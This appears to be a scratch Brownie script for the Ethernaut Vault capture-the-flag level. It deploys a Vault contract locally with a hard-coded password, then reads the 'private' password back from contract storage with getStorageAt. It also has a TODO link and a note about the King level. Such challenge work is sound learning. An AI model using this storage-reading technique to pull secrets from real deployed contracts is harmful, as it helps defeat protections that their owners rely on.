from brownie import Vault, accounts, web3
import binascii




def main():
  account_one, account_two = accounts[0], accounts[2]
  password = u'super_secret'
  hex_bytes = binascii.hexlify(password.encode('cp1252')) 

  force_contract = Vault.deploy(hex_bytes, {
    'from': account_one,
    'gas_price': 500000
  })

  print(f"current contract-balance: {force_contract.balance()}")

  storage_value = web3.eth.getStorageAt(force_contract.address, 1)
  print(f"storage-value: {storage_value}")
  # storage value --> convert to ascii (binascii.unhexlify) and will see password stored


# TODO: Proceed here: 
  # https://ethernaut.openzeppelin.com/level/0x25141B6345378e7558634Cf7c2d9B8670baFA417 

 


# king a contract where there is no transfer/receive (contract cannot receive eth it sent)
 


